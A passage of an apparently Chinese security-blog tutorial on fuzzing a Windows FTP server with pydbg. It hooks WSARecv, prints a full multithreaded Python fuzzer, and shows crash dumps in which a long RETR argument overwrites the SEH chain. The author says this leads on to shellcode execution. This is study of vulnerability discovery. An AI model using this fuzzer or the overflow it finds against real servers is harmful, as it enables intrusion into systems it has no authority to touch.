 +0c: 0012d804 ( 1234948) -&gt; C:\AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA (stack)
 +10: 00de6668 ( 14575208) -&gt; fgh_uasortTH_GREGOR`TTbR=CRG9^ATRRhfaOPg
TH_GREGOR`TTbRWCR (heap)
 +14: 00000000 ( 0) -&gt; N/A

disasm around:
 0x77c1211b jz 0x77c12136
 0x77c1211d mov dl,[ecx]
 0x77c1211f inc ecx
 0x77c12120 test dl,dl
 0x77c12122 jz 0x77c12188
 0x77c12124 mov [edi],dl
 0x77c12126 inc edi
 0x77c12127 test ecx,0x3
 0x77c1212d jnz 0x77c1211d
 0x77c1212f jmp 0x77c12136
 0x77c12131 mov [edi],edx
 0x77c12133 add edi,0x4
 0x77c12136 mov edx,0x7efefeff
 0x77c1213b mov eax,[ecx]
 0x77c1213d add edx,eax
 0x77c1213f xor eax,0xffffffff
 0x77c12142 xor eax,edx
 0x77c12144 mov edx,[ecx]
 0x77c12146 add ecx,0x4
 0x77c12149 test eax,0x81010100
 0x77c1214e jz 0x77c12131

SEH unwind:
 41414141 -&gt; [INVALID]:41414141 Unable to disassemble at 41414141
 ffffffff -&gt; [INVALID]:ffffffff Unable to disassemble at ffffffff</pre>
<h3>四:hook api实现数据包打印</h3>
<p>首先查看是用的哪个dll的导出函数</p>
<p><img class="alignnone size-full wp-image-87997 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/08/7-31.png" alt="7" width="501" height="139" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/08/7-31.png 501w, http://www.mottoin.com/wp-content/uploads/2016/08/7-31-300x83.png 300w" sizes="(max-width: 501px) 100vw, 501px" /></p>
<p>这里可以看到用了ws2_32和wsock32,hook wsock32 recv</p>
<p><img class="alignnone size-full wp-image-87998 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/08/8-30.png" alt="8" width="593" height="613" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/08/8-30.png 593w, http://www.mottoin.com/wp-content/uploads/2016/08/8-30-290x300.png 290w" sizes="(max-width: 593px) 100vw, 593px" /></p>
<p>0x71A42E9E位置调用了ws2_32的WSARecv函数,bp ws2_32.WSARecv</p>
<p><img class="alignnone size-full wp-image-87999 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/08/9-25.png" alt="9" width="1455" height="612" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/08/9-25.png 1455w, http://www.mottoin.com/wp-content/uploads/2016/08/9-25-300x126.png 300w, http://www.mottoin.com/wp-content/uploads/2016/08/9-25-768x323.png 768w, http://www.mottoin.com/wp-content/uploads/2016/08/9-25-1024x431.png 1024w" sizes="(max-width: 1455px) 100vw, 1455px" /></p>
<p>查看数据包结尾标志,这里是&#8217;\x0D&#8217;,读内存代码大致如下:</p>
<pre class=""> buffer=''
 while 1:
 byte = dbg.read_process_memory( aaa + offset, 1 )
 if byte != '\x0D':
 buffer += byte
 offset += 1
 continue
 else:
 break
 print buffer</pre>
<p>看WSARecv的结构</p>
<pre class="">int WSARecv(
 _In_ SOCKET s,
 _Inout_ LPWSABUF lpBuffers,
 _In_ DWORD dwBufferCount,
 _Out_ LPDWORD lpNumberOfBytesRecvd,
 _Inout_ LPDWORD lpFlags,
 _In_ LPWSAOVERLAPPED lpOverlapped,
 _In_ LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine
);</pre>
<p>断在WSARecv上</p>
<p><img class="alignnone size-full wp-image-88000 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/08/10-18.png" alt="10" width="512" height="128" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/08/10-18.png 512w, http://www.mottoin.com/wp-content/uploads/2016/08/10-18-300x75.png 300w" sizes="(max-width: 512px) 100vw, 512px" /></p>
<p>lpOverlapped is null,那么就是说为阻塞式,可以直接hook<br />
跟踪recv</p>
<p><img class="alignnone size-full wp-image-88001 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/08/11-17.png" alt="11" width="1113" height="201" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/08/11-17.png 1113w, http://www.mottoin.com/wp-content/uploads/2016/08/11-17-300x54.png 300w, http://www.mottoin.com/wp-content/uploads/2016/08/11-17-768x139.png 768w, http://www.mottoin.com/wp-content/uploads/2016/08/11-17-1024x185.png 1024w" sizes="(max-width: 1113px) 100vw, 1113px" /></p>
<p>在recv结束后ebx的值为BUFFER,缓冲区的数据会写入BUFFER指向的位置,所以在该api结束时callback即可<br />
func_resolve_debug获得地址,创建一个container容器,源码上有example:</p>
<p><img class="alignnone size-full wp-image-88002 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/08/12-11.png" alt="12" width="1403" height="673" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/08/12-11.png 1403w, http://www.mottoin.com/wp-content/uploads/2016/08/12-11-300x144.png 300w, http://www.mottoin.com/wp-content/uploads/2016/08/12-11-768x368.png 768w, http://www.mottoin.com/wp-content/uploads/2016/08/12-11-1024x491.png 1024w" sizes="(max-width: 1403px) 100vw, 1403px" /></p>
<p>hook参数格式:hook.add(pydbg实例,要钩住的api,地址,接受的参数数量,调用时的callback,结束时的callback) 发包USER 1 PASS 1 APPE AAAAA效果如下:</p>
<p><img class="alignnone size-full wp-image-88003 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/08/13-12.png" alt="13" width="288" height="160" /></p>
<p>现在加上发包行为,当程序溢出时,最后一个打印出来的包就是poc了</p>
<p>发500长度数据包,hook recv,打印最后poc,然后覆盖缓冲区,触发异常,看效果:</p>
<p><img class="alignnone size-full wp-image-88004 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/08/14-11.png" alt="14" width="660" height="680" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/08/14-11.png 660w, http://www.mottoin.com/wp-content/uploads/2016/08/14-11-291x300.png 291w" sizes="(max-width: 660px) 100vw, 660px" /></p>
<p>现在需要做的就是在程序内内嵌一个发包动作了</p>
<h3>五:发包</h3>
<p>这里要注意win下多线程socket recv的问题,假如非阻塞的情况,接受不到数据就会触发异常.</p>
<p>可能是由于多线程的原因,读内存时偶尔会触发bug,想来是A线程读内存时B线程在相同的位置进行写入动作,本来嘛,python多线程就不是同步的,加上ReadProcessMemory和WriteProcessMemory应该有锁,我又给每个线程加上了休眠动作,感觉应该可以了,结果gg&#8230; 最后在读内存语句加上了互斥锁才得以解决. 重要的地方都注释了,完整的代码:</p>
<pre class="">#!/usr/bin/env python
# -*- coding:utf-8 -*-
try:
 from pydbg import *
 from pydbg.defines import *
 import utils
except:
 print 'pydbg or utils install error'
from ctypes import *
import sys
import random
import socket
import getopt
import Queue
import threading
import time

gLock=threading.Lock()
#global mutex lock

def crashInfo(debugger):
 crash_bin = utils.crash_binning.crash_binning()
 crash_bin.record_crash(debugger)
 return crash_bin.crash_synopsis()


def accessViolationCallback(debugger):
 if debugger.dbg.u.Exception.dwFirstChance:

print debugger.disasm(debugger.context.Eip)
 print crashInfo(debugger)
 debugger.terminate_process()
 return DBG_EXCEPTION_NOT_HANDLED
 #if DBG_EXCEPTION_NOT_HANDLED then seh-&gt;veh-&gt;kill


def loadDllCallback(debugger):
 global hooks,flag
 if flag:
 hookAddress=debugger.func_resolve_debuggee('ws2_32.dll','WSARecv')
 #getModuleHandleA -&gt; getProcAddress -&gt; closeHandle

if hookAddress:
 hooks.add(debugger,hookAddress,4,exit_hook=readProcessMemory)
 print '[*] hook ws2_32.dll revc 0x%08x success\n' % hookAddress
 flag=0
 return DBG_CONTINUE

def readProcessMemory(debugger,args,ret):
 #time.sleep(random.uniform(0,0.05))
 try:
 print '[*] recving...\n'
 buffer = ""
 offset = 0
 ebxAddress=debugger.context.Ebx
 #the recv after get ebx address

while 1:
 gLock.acquire()
 #threading read memory + write memory can error,so use mutex
 byte = debugger.read_process_memory( ebxAddress + offset, 1 )
 gLock.release()

if byte!='\x0D':
 buffer += byte
 offset += 1
 continue
 else:
 break
 except:
 pass
 print buffer
 return DBG_CONTINUE

def initialiationThread(ip,user,password,port):

fuzzCommand=['LIST','APPE','RAW','RSET','XPWD','ALLO',
 'CWD','ACCT','CDUP','DELE','HELP','MKD','MODE','NLST',
 'NOOP','PASV','PORT','PWD','XRMD','RETR','RMD','RNFR',
 'RNTO','SITE','SMNT','STOR','STRU','SYST','TYPE','AUTH',
 'HOST','LANG','MDTM','OPTS','SIZE CHMOD','SIZE CHOWN','SIZE EXEC',
 'SITE INDEX','SIZE PSWD','SIZE ZONE','SIZE WHO','XCUP','XCWD']
 queue=Queue.Queue()
 [queue.put(i) for i in fuzzCommand]


 threadList=[]
 for i in xrange(0,20):
 t=threading.Thread(target=multiThread,args=(queue,ip,user,password,port,))
 threadList.append(t)
 for i in threadList:
 i.start()
 for i in threadList:
 i.join(random.uniform(0,0.03))


def multiThread(queue,ip,user,password,port):
 #time.sleep(random.uniform(1,3))
 time.sleep(10)
 #sleep 10s ,control -&gt; main,else recv raise except

bufferString=['A'*25*(i+1) for i in xrange(30)]
 try:
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 connect=s.connect((ip,int(port)))
 print 'ccccccccc'
 s.recv(1024)


 while not queue.empty():
 #if queue is null, not while conditional,then GIL pause.
 ftpCommand=queue.get(block=False)
 for i in bufferString:
 s.send('USER'+' '+str(user)+'\r\n')
 s.recv(1024)
 s.send('PASS'+' '+str(password)+'\r\n')
 s.recv(1024)
 s.send(ftpCommand+' '+i+'\r\n')
 s.recv(1024)

except socket.error,Queue.Empty:
 #queue.queue.clear()
 print 'ftp didn\'t response'
 except Exception,e:
 print e
 finally:
 s.close()
 #because other thread may not spark except,so finally s.close()


def getArgv():
 try:
 options,args = getopt.getopt(sys.argv[1:],'hi:u:p:P:',['help','ip=','user=','pass=','port='])
 if len(options)==0:
 raise Exception
 except Exception,e:
 usage()

for name,value in options:
 if name in ('-h','--help'):
 usage()
 if name in ('-i','--ip'):
 ip=value
 if name in ('-u','--user'):
 user=value
 if name in ('-p','--pass'):
 password=value
 if name in ('-P','--port'):
 port=value
 initialiationThread(ip,user,password,port)


def usage():

print '[*] python fuzz.py -i 127.0.0.1 -u test -p test -P 21'
 print '[*] python fuzz.py --ip 127.0.0.1 --user test --pass test --port 21'
 print '[*] thanks bstaint'
 print '[*] author pr0mise'
 sys.exit(-1)

def main():
 getArgv()

print '\n'
 debugger=pydbg()
 targetProgramName=u'守望迷你ftp服务器.exe'
 global hooks,flag
 flag=0
 hooks = utils.hook_container()


 #enumerate process.filter target ftp program
 for (pid, name ) in debugger.enumerate_processes():
 if name ==targetProgramName.encode('gbk') :
 # name.encode('gbk')... windows font format.. you know...
 debugger.attach(pid)
 flag=1
 print '[*] attaching to program with pid %d ' %pid

if flag==0:
 print '[*] target program not found\n'
 sys.exit(-1)
 debugger.set_callback(EXCEPTION_ACCESS_VIOLATION, accessViolationCallback)
 #raise EXCEPTION_ACCESS_VIOLATION,Callback "accessViolationCallback" func

debugger.set_callback(LOAD_DLL_DEBUG_EVENT, loadDllCallback)
 #the LoadLibrary('dll') after callback loadDllCallback func

debugger.run()

if __name__ == '__main__':
 main()
RETR mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm
mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm
mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm
mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm
mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm
mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm
mmmmmmmmmmmmmmmmmmmmmmmmm
mov [edi],edx
msvcrt.dll:77c12131 mov [edi],edx from thread 692 caused access violation
when attempting to write to 0x00130000

CONTEXT DUMP
 EIP: 77c12131 mov [edi],edx
 EAX: 7efefefe (2130640638) -&gt; N/A
 EBX: 00000000 ( 0) -&gt; N/A
 ECX: 0012fe0c ( 1244684) -&gt; mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmC:\mm
mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm
mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm
mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm (stack)
 EDX: 6d6d6d6d (1835887981) -&gt; N/A
 EDI: 0012ffff ( 1245183) -&gt; Actx L| 4d[IY-2(0pSsHd,,ZZ (stack)
 ESI: 030f4cf8 ( 51334392) -&gt; C:/mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm
mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm
mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm
mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm (heap)
 EBP: 0012decc ( 1236684) -&gt; mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm
mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm
mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm
mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm (stack)
 ESP: 0012dabc ( 1235644) -&gt; RAhfC:\mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm
mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm
mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm
mmmmmmmmmmmmmmmmmmmmmmmm (stack)
 +00: 00000000 ( 0) -&gt; N/A
 +04: 00410952 ( 4262226) -&gt; uEuuPVr;uEu^^EuPuuV;Et&amp;9_ u!hQuuVujW3;t}EwEuPEP
'+=HiujW3Et1u}VW!VhQjVuS)VsE$Eu (守望迷你ftp服务器.exe.data)
 +08: 0012dccc ( 1236172) -&gt; mmmC:\mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm
mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm
mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm
mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm (stack)
 +0c: 0012dad8 ( 1235672) -&gt; C:\mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm
mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm
mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm
mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm (stack)
 +10: 00de6668 ( 14575208) -&gt; fgh_uasortTH_GREGOR`TTbR=CRG9^ATRRhfaOPggfuksor
TH_GREGOR`TTbRWCR (heap)
 +14: 00000000 ( 0) -&gt; N/A

disasm around:
 0x77c1211b jz 0x77c12136
 0x77c1211d mov dl,[ecx]
 0x77c1211f inc ecx
 0x77c12120 test dl,dl
 0x77c12122 jz 0x77c12188
 0x77c12124 mov [edi],dl
 0x77c12126 inc edi
 0x77c12127 test ecx,0x3
 0x77c1212d jnz 0x77c1211d
 0x77c1212f jmp 0x77c12136
 0x77c12131 mov [edi],edx
 0x77c12133 add edi,0x4
 0x77c12136 mov edx,0x7efefeff
 0x77c1213b mov eax,[ecx]
 0x77c1213d add edx,eax
 0x77c1213f xor eax,0xffffffff
 0x77c12142 xor eax,edx
 0x77c12144 mov edx,[ecx]
 0x77c12146 add ecx,0x4
 0x77c12149 test eax,0x81010100
 0x77c1214e jz 0x77c12131

SEH unwind:
 6d6d6d6d -&gt; [INVALID]:6d6d6d6d Unable to disassemble at 6d6d6d6d
 ffffffff -&gt; [INVALID]:ffffffff Unable to disassemble at ffffffff


ftp didn't response
ftp didn't response
ftp didn't response</pre>
<p>可以看到fuzz出RETR命令发送长数据包可导致溢出,前面的文章介绍过,配合mona找到刚好覆盖到seh chain的位置,改一下exp.py就可以执行shellcode了. 文章到此结束,纰漏之处 欢迎诸君批评、斧正.</p>
<p>***特别感谢bstaint表哥和赵中老师的帮助.</p>
<h2>参考文档</h2>
<ul>
<li>《模糊测试-强制发觉安全漏洞的利器》</li>
<li>《python灰帽子》</li>
<li>http://pedramamini.com/PaiMei/heap_trace/hook_container.py</li>
<li>http://bbs.pediy.com/showthread.php?t=151870</li>
</ul>
<p>&nbsp;</p>
<p style="text-align: center;">*作者：<a href="http://www.ohvirus.com/1.code/2016-04-21-fuzz-wesaywhat.html">pr0mise </a> Mottoin整理发布</p>
                                                        <div class="entry-copyright"><p>原创文章，作者：Moto，如若转载，请注明出处：http://www.mottoin.com/87985.html</p></div>                        </div>
                        <div class="entry-footer">
                            <div class="entry-tag"><a href="http://www.mottoin.com/tag/exp" rel="tag">exp</a><a href="http://www.mottoin.com/tag/fuzz" rel="tag">Fuzz</a><a href="http://www.mottoin.com/tag/python%e7%81%b0%e5%b8%bd%e5%ad%90" rel="tag">python灰帽子</a><a href="http://www.mottoin.com/tag/shellcode" rel="tag">shellcode</a><a href="http://www.mottoin.com/tag/wsarecv" rel="tag">WSARecv</a><a href="http://www.mottoin.com/tag/%e5%ae%89%e5%85%a8%e6%bc%8f%e6%b4%9e" rel="tag">安全漏洞</a><a href="http://www.mottoin.com/tag/%e6%a8%a1%e7%b3%8a%e6%b5%8b%e8%af%95" rel="tag">模糊测试</a></div>
                            <div class="entry-action">
                                <div class="btn-zan" data-id="87985"><i class="fa fa-thumbs-up"></i> 赞 <span class="entry-action-num">(0)</span></div>

                                
                            </div>
                            <div class="entry-bar">
                                <div class="entry-bar-inner clearfix">
                                                                            <div class="author pull-left">
                                            <a data-user="7" target="_blank" href="http://www.mottoin.com/user/seceditor/" class="avatar">
                                                <img src="http://gravatar.com/avatar/?s=400&d=mm" class="func-um_user gravatar avatar avatar-60 um-avatar um-avatar-gravatar" width="60" height="60" alt="Moto" />                                                Moto                                            </a>
                                            <span class="author-title">普通用户</span>                                         </div>
                                                                        <div class="info pull-right">
                                        <div class="info-item meta">
                                            <a class="meta-item j-heart" href="javascript:;" data-id="87985"><i class="fa fa-heart"></i> <span class="data">0</span></a>
                                            <a class="meta-item" href="#comments"><i class="fa fa-comment"></i> <span class="data">0</span></a>
                                                                                    </div>
                                        <div class="info-item share">
                                            <a class="meta-item" href="javascript:;">
                                                <i class="fa fa-wechat"></i>
                                                <span class="wx-wrap">
                                                    <img src="//pan.baidu.com/share/qrcode?w=320&h=320&url=http://www.mottoin.com/87985.html">
                                                    <span>扫码分享到微信</span>
                                                </span>
                                            </a>
                                            <a class="meta-item" href="http://share.baidu.com/s?type=text&searchPic=1&sign=on&to=tsina&key=&url=http%3A%2F%2Fwww.mottoin.com%2F87985.html&title=%E6%8F%90%E8%B5%B7%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95%E6%97%B6%E6%88%91%E4%BB%AC%E5%9C%A8%E8%AF%B4%E4%BB%80%E4%B9%88" target="_blank"><i class="fa fa-weibo"></i></a>
                                            <a class="meta-item" href="http://share.baidu.com/s?type=text&searchPic=1&sign=on&to=qzone&key=&url=http%3A%2F%2Fwww.mottoin.com%2F87985.html&title=%E6%8F%90%E8%B5%B7%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95%E6%97%B6%E6%88%91%E4%BB%AC%E5%9C%A8%E8%AF%B4%E4%BB%80%E4%B9%88" target="_blank"><i class="fa fa-qq"></i></a>
                                        </div>
                                        <div class="info-item act">
                                            <a href="javascript:;" id="j-reading"><i class="fa fa-file-text"></i></a>
                                        </div>
                                    </div>
                                </div>
                            </div>
                                                        <h3 class="entry-related-title">相关推荐</h3><ul class="entry-related clearfix"><li><a href="http://www.mottoin.com/98611.html" title="Android / Ztorg恶意软件拆解分析（第2部分）">Android / Ztorg恶意软件拆解分析（第2部分）</a></li><li><a href="http://www.mottoin.com/89035.html" title="常见app加固厂商脱壳方法研究">常见app加固厂商脱壳方法研究</a></li><li><a href="http://www.mottoin.com/84388.html" title="CVE-2016-4203分析：Adobe Acrobat和Reader 的CoolType处理导致的堆溢出漏洞">CVE-2016-4203分析：Adobe Acrobat和Reader 的CoolType处理导致的堆溢出漏洞</a></li><li><a href="http://www.mottoin.com/90073.html" title="2016 CFF reverse write-up">2016 CFF reverse write-up</a></li><li><a href="http://www.mottoin.com/84372.html" title="对burpsuite_pro逆向的一点心得">对burpsuite_pro逆向的一点心得</a></li><li><a href="http://www.mottoin.com/88716.html" title="逆向分享 – Reversing.Kr (3-final-ing)">逆向分享 – Reversing.Kr (3-final-ing)</a></li><li><a href="http://www.mottoin.com/88278.html" title="Linux简单内核栈溢出调试分析">Linux简单内核栈溢出调试分析</a></li><li><a href="http://www.mottoin.com/101998.html" title="远控木马中的VIP：盗刷网购账户购买虚拟礼品卡">远控木马中的VIP：盗刷网购账户购买虚拟礼品卡</a></li><li><a href="http://www.mottoin.com/95759.html" title="浏览器漏洞利用学习篇之 Internet Explorer 11（上）">浏览器漏洞利用学习篇之 Internet Explorer 11（上）</a></li><li><a href="http://www.mottoin.com/85378.html" title="逆向分析：面试Tencent的简单笔试题">逆向分析：面试Tencent的简单笔试题</a></li></ul>                        </div>
                        
<div id="comments" class="entry-comments">
    	<div id="respond" class="comment-respond">
		<h3 id="reply-title" class="comment-reply-title">发表评论 <small><a rel="nofollow" id="cancel-comment-reply-link" href="/87985.html#respond" style="display:none;">取消回复</a></small></h3><div class="comment-form"><div class="comment-must-login">请登录后评论...</div><div class="form-submit"><div class="form-submit-text pull-left"><a href="http://www.mottoin.com/login">登录</a>后才能评论</div> <input name="submit" type="submit" id="must-submit" class="submit" value="发表"></div></div>	</div><!-- #respond -->
		</div><!-- .comments-area -->                    </div>
                </article>
                    </div>
        <aside class="sidebar">
            <div id="profile-3" class="widget widget_profile">                <div class="cover_photo"></div>
                        <div class="avatar-wrap">
                <a target="_blank" href="http://www.mottoin.com/user/seceditor/" class="avatar-link"><img src="http://gravatar.com/avatar/?s=400&d=mm" class="func-um_user gravatar avatar avatar-120 um-avatar um-avatar-gravatar" width="120" height="120" alt="Moto" /></a></div>
            <div class="profile-info">
                <p><span class="author-name">Moto</span><span class="author-title">普通用户</span></p>
                <p class="author-description"></p>
            </div>
            <div class="profile-posts">
                <h3 class="widget-title"><span>最近文章</span></h3>
                <ul>                    <li><a href="http://www.mottoin.com/101279.html" title="Windows内核漏洞发现与利用">Windows内核漏洞发现与利用</a></li>
                                    <li><a href="http://www.mottoin.com/100495.html" title="浏览器信息收集: 利用 PowerShell 无文件读取 Chrome Cookie">浏览器信息收集: 利用 PowerShell 无文件读取 Chrome Cookie</a></li>
                                    <li><a href="http://www.mottoin.com/99735.html" title="一键无文件感染技术分析">一键无文件感染技术分析</a></li>
                                    <li><a href="http://www.mottoin.com/99776.html" title="APT10：中国黑客组织攻击全球IT服务供应商">APT10：中国黑客组织攻击全球IT服务供应商</a></li>
                                    <li><a href="http://www.mottoin.com/99257.html" title="IIS 6.0 WebDAV远程代码执行（CVE-2017-7269）">IIS 6.0 WebDAV远程代码执行（CVE-2017-7269）</a></li>
                </ul>            </div>
            </div><div id="custom_html-3" class="widget_text widget widget_custom_html"><div class="textwidget custom-html-widget"><a class="btn-post" href="/question"><i class="fa fa-edit"></i> 我要提问</a></div></div><div id="post-thumb-3" class="widget widget_post_thumb">            <ul>
                                    <li class="item">
                                                    <div class="item-img">
                                <a href="http://www.mottoin.com/105921.html" title="“黑客反击”的合法化之争">
                                    <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/170918-Cox-The-Hackers-Hitting-Back-At-Cybercriminals-hero_vkcor5-480x300.gif" width="480" height="300" alt="“黑客反击”的合法化之争">                                </a>
                            </div>
                                                <div class="item-content">
                            <p class="item-title"><a href="http://www.mottoin.com/105921.html" title="“黑客反击”的合法化之争">“黑客反击”的合法化之争</a></p>
                            <p class="item-date">2017年9月20日</p>
                        </div>
                    </li>
                                    <li class="item">
                                                    <div class="item-img">
                                <a href="http://www.mottoin.com/105917.html" title="美参议员要求电信巨头们回应SS7信令系统的安全问题">
                                    <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/WechatIMG929-480x300.jpeg" width="480" height="300" alt="美参议员要求电信巨头们回应SS7信令系统的安全问题">                                </a>
                            </div>
                                                <div class="item-content">
                            <p class="item-title"><a href="http://www.mottoin.com/105917.html" title="美参议员要求电信巨头们回应SS7信令系统的安全问题">美参议员要求电信巨头们回应SS7信令系统的安全问题</a></p>
                            <p class="item-date">2017年9月19日</p>
                        </div>
                    </li>
                                    <li class="item">
                                                    <div class="item-img">
                                <a href="http://www.mottoin.com/105914.html" title="美国国土安全部发布禁止使用卡巴斯基产品的明细">
                                    <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/WechatIMG928-480x300.jpeg" width="480" height="300" alt="美国国土安全部发布禁止使用卡巴斯基产品的明细">                                </a>
                            </div>
                                                <div class="item-content">
                            <p class="item-title"><a href="http://www.mottoin.com/105914.html" title="美国国土安全部发布禁止使用卡巴斯基产品的明细">美国国土安全部发布禁止使用卡巴斯基产品的明细</a></p>
                            <p class="item-date">2017年9月19日</p>
                        </div>
                    </li>
                                    <li class="item">
                                                    <div class="item-img">
                                <a href="http://www.mottoin.com/105885.html" title="【威胁预警】供应链攻击：CCleaner 5.33官方下载被植入恶意代码（附技术详解）">
                                    <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/WechatIMG906-480x300.jpeg" width="480" height="300" alt="【威胁预警】供应链攻击：CCleaner 5.33官方下载被植入恶意代码（附技术详解）">                                </a>
                            </div>
                                                <div class="item-content">
                            <p class="item-title"><a href="http://www.mottoin.com/105885.html" title="【威胁预警】供应链攻击：CCleaner 5.33官方下载被植入恶意代码（附技术详解）">【威胁预警】供应链攻击：CCleaner 5.33官方下载被植入恶意代码（附技术详解）</a></p>
                            <p class="item-date">2017年9月19日</p>
                        </div>
                    </li>
                                    <li class="item">
                                                    <div class="item-img">
                                <a href="http://www.mottoin.com/105879.html" title="全球首款网络安全概念车驶入上海滩">
                                    <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/15057198871-480x300.png" width="480" height="300" alt="全球首款网络安全概念车驶入上海滩">                                </a>
                            </div>
                                                <div class="item-content">
                            <p class="item-title"><a href="http://www.mottoin.com/105879.html" title="全球首款网络安全概念车驶入上海滩">全球首款网络安全概念车驶入上海滩</a></p>
                            <p class="item-date">2017年9月18日</p>
                        </div>
                    </li>
                                    <li class="item">
                                                    <div class="item-img">
                                <a href="http://www.mottoin.com/105872.html" title="暗网市场上开始兜售Equifax的数据，数据泄漏后常见的诈骗招数1、2、3">
